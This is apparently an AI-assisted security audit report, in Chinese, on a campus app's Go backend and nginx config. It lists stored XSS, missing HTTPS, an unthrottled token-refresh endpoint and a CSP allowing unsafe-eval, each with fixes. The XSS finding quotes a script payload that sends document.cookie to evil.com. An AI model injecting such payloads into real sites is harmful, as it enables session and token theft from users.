# 铁壁 v2.2 安全审计报告 — campus_go

> **审计时间:** 2026-06-24
> **审计工具:** 铁壁 v2.2 (7步门控 + Severity Rubric + 3Q攻击场景测试)
> **目标:** campus_go Go 后端 + nginx 配置
> **审计员:** 皮特 (Claude Code + 铁壁 skill)

---

## 执行摘要

全量 7 步门控审计完成。**发现 4 个安全漏洞** (2 HIGH, 2 MEDIUM)，**0 个假阳性**。

| 级别 | 数量 | 必须响应 |
|------|------|---------|
| 🔴 CRITICAL | 0 | — |
| 🟠 HIGH | 2 | 本周修 |
| 🟡 MEDIUM | 2 | 本月修 |
| 🟢 LOW | 0 | — |

---

## 发现清单

### 🟠 HIGH-1: 存储型 XSS — CreateActivity description 未清洗

**位置:** `campus_go/internal/handlers/activities_admin.go:96-115`
**OWASP:** A03:2021 Injection
**分类:** S0 注入类

**攻击场景测试 (3Q):**
```
Q1: 攻击者需要什么？  → 任意注册用户（学生角色即可），无需特殊权限
Q2: 攻击路径是什么？  → POST /api/activities with description="<script>fetch('https://evil.com/?c='+document.cookie)</script>"
                         活动发布后，其他用户查看活动详情 → 前端渲染 description → 脚本执行
Q3: 攻击收益是什么？  → 窃取其他用户 JWT token/session、钓鱼跳转、篡改页面内容、批量传播蠕虫
```
**判定:** 3Q 全部通过 → 真实漏洞，HIGH 级别。

**根因:** `CreateActivity` 将 `req.Description` 直接 INSERT 到数据库（第 97-115 行），未经过 `html.EscapeString()` 或 `bluemonday` 等 HTML sanitizer 清洗。整个代码库中不存在任何 HTML 清洗逻辑（`grep -ri "html.EscapeString\|bluemonday\|sanitiz" campus_go/` → 0 结果）。

**修复建议:**
```go
import "html"

// 在 INSERT 之前:
req.Description = html.EscapeString(req.Description)
```
或引入 `github.com/microcosm-cc/bluemonday` 做更精细的清洗策略。

**验证:**
```bash
curl -X POST /api/activities \
  -H "Authorization: Bearer <student_token>" \
  -d '{"title":"test","description":"<script>alert(1)</script>","reward_type":"volunteer",...}'
# 预期: description 被清洗为 &lt;script&gt;alert(1)&lt;/script&gt;
```

---

### 🟠 HIGH-2: 无 HTTPS/TLS — 全流量明文传输

**位置:** `nginx-campus.conf:7-8` (仅监听 port 80，无 SSL 配置)
**OWASP:** A02:2021 Cryptographic Failures
**分类:** 不安全配置

**攻击场景测试 (3Q):**
```
Q1: 攻击者需要什么？  → 与服务器在同一网络（校园网/公共WiFi），无需任何认证
Q2: 攻击路径是什么？  → ARP欺骗/MITM → 截获 HTTP 流量 → JWT token、密码、个人信息明文可见
Q3: 攻击收益是什么？  → JWT token劫持→冒充任意用户。密码泄露→撞库。个人信息泄露→社工。
```
**判定:** 3Q 全部通过 → 真实漏洞，HIGH 级别。

**根因:** nginx 配置只有 `listen 80`，无 `listen 443 ssl` 配置块。所有 API 流量（登录、注册、活动数据）通过 HTTP 明文传输。JWT token 在 `Authorization: Bearer <token>` 头中明文暴露。

**修复建议:**
```nginx
server {
    listen 443 ssl http2;
    ssl_certificate /etc/nginx/ssl/campus.crt;
    ssl_certificate_key /etc/nginx/ssl/campus.key;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
    # ...
}
server {
    listen 80;
    return 301 https://$host$request_uri;  # HTTP→HTTPS 重定向
}
```
使用 Let's Encrypt 免费证书或阿里云 SSL 证书。

---

### 🟡 MEDIUM-1: RefreshToken 端点无限流 — 可被暴力刷新

**位置:** `campus_go/main.go:46`
**分类:** RateLimit 缺失

**攻击场景测试 (3Q):**
```
Q1: 攻击者需要什么？  → 一个有效的 refresh_token（可从 XSS 或 MITM 获取）
Q2: 攻击路径是什么？  → POST /api/token/refresh 无限循环 → 消耗服务器资源 + 永不过期
Q3: 攻击收益是什么？  → 持久化访问（绕过 token 过期机制）、拒绝服务（资源耗尽）
```
**判定:** 3Q 通过 → 真实漏洞。但需要已有有效 token，利用链较长 → MEDIUM。

**根因:** `main.go:46` 注册 `/api/token/refresh` 时未添加任何速率限制中间件。对比 `/api/register` 有限流 `RateLimit(6, time.Minute)`，refresh 端点完全裸露。

**修复建议:**
```go
// main.go:46
api.POST("/token/refresh", middleware.RateLimit(10, time.Minute), handlers.RefreshToken(db))
```

---

### 🟡 MEDIUM-2: CSP 包含 'unsafe-eval' — 允许脚本注入绕过

**位置:** `nginx-campus.conf:19`
**分类:** 不安全配置

**攻击场景测试 (3Q):**
```
Q1: 攻击者需要什么？  → 已通过 XSS (HIGH-1) 注入了恶意脚本
Q2: 攻击路径是什么？  → XSS注入的脚本使用 eval()/Function() 执行任意代码 → CSP 不阻止
Q3: 攻击收益是什么？  → XSS 升级为任意代码执行，绕过 CSP 的 script-src 限制
```
**判定:** 3Q 通过 → 真实漏洞。但需要 XSS 前置条件 → MEDIUM。

**修复建议:**
移除 `'unsafe-eval'` 和 `'wasm-unsafe-eval'`。如 Flutter Web 需要 `wasm-unsafe-eval`，至少去除 `'unsafe-eval'`。使用 nonce-based CSP 替代。

---

## 7步门控完整结果

### Step 1: 密钥扫描 ✅ PASS
- JWT_SECRET: 环境变量读取，未设置时拒绝启动 (`ValidateConfig()`)
- 无硬编码密钥、密码、token

### Step 2: SAST ⚠️ 1 HIGH
- ✅ SQL 全部参数化查询
- ✅ JWT 算法验证 (HS256 only)
- ✅ 密码哈希 bcrypt/argon2id
- ✅ DB 角色验证 (不信任 token role)
- ❌ **HIGH-1: description 未清洗**

### Step 3: 端点审计 ⚠️ 1 MEDIUM
- ✅ Login: nginx 5r/m + in-handler 12s cooldown
- ✅ Register: nginx 1r/m + middleware RateLimit(6/min)
- ✅ ResetPassword: 5min phone + 20s IP
- ✅ Upload: 扩展名白名单 + 10MB 限制
- ✅ Admin 端点: college scope 隔离正确
- ❌ **MEDIUM-1: RefreshToken 无限流**

### Step 4: 硬编码密钥 ✅ PASS
- 无硬编码凭据
- 注册码通过环境变量

### Step 5: 依赖 CVE ✅ PASS
- Go: gin v1.10.1, pgx v5.10.0, jwt v5.3.1, crypto v0.46.0 — 全部最新
- Python: campus_app/server/requirements.txt 需单独检查
- Flutter: campus_app/pubspec.yaml 需单独检查

### Step 6: 服务器扫描 ⚠️ 2 HIGH+MEDIUM
- ❌ **HIGH-2: 无 HTTPS/TLS**
- ❌ **MEDIUM-2: CSP unsafe-eval**
- ✅ 安全头: XFO/XCTO/XXSSP/RP 齐全
- ✅ nginx 限流: login 5r/m, register 1r/m, api 60r/m
- ✅ 探测拦截: PHP/ASP/WordPress 路径 → 444
- ✅ Netdata: auth_basic 保护

### Step 7: DB 审计 ✅ PASS
- ✅ 100% 参数化查询
- ✅ College scope 隔离
- ✅ `ON CONFLICT DO NOTHING` 防竞态
- ✅ `FOR UPDATE` 防并发
- ⚠️ 加密静态存储: 未验证 (需检查 PostgreSQL 加密配置)
- ⚠️ 备份加密: 未验证

---

## 修复优先级

| 优先级 | ID | 问题 | 工作量 | 风险 |
|--------|----|------|--------|------|
| 1 (立即) | HIGH-1 | 存储XSS | 1行代码 + 1个import | 学生可窃取管理员token |
| 2 (本周) | HIGH-2 | 无HTTPS | 申请证书 + nginx配置 | 校园网MITM可劫持所有用户 |
| 3 (本月) | MEDIUM-1 | RefreshToken限流 | 1行代码 | 需结合XSS/MITM利用 |
| 4 (本月) | MEDIUM-2 | CSP unsafe-eval | 1行nginx配置 | 需结合XSS利用 |

---

## 正面发现 (安全强项)

1. **JWT 安全设计**: TokenVersion 单设备强制 + DB role 验证 + HMAC 算法锁定 + refresh rotation
2. **密码安全**: bcrypt/argon2id 双支持，72字符上限
3. **SQL 注入防护**: 100% 参数化查询，无拼接
4. **权限隔离**: College scope 在 Approve/Reject/Modify/ListUsers 中一致实施
5. **竞态防护**: ON CONFLICT DO NOTHING + FOR UPDATE + 事务包裹
6. **安全头**: XFO/XCTO/XXSSP/RP/CSP 完整
7. **注册码系统**: 分角色注册码，防批量注册

---

## 审计元数据

- **审计 skill 版本:** 铁壁 v2.2
- **审计方法:** 7步门控 (Step1-7 全量) + Severity Rubric (CRITICAL/HIGH/MEDIUM/LOW) + 3Q攻击场景测试
- **代码库版本:** campus_go @ skill-lab/20260621-bughunt (c7e7afd)
- **覆盖范围:** Go 后端 (middleware + handlers) + nginx 配置
- **未覆盖:** Python 后端 (campus_app/server/), Flutter 前端 (campus_app/), 数据库运行时配置
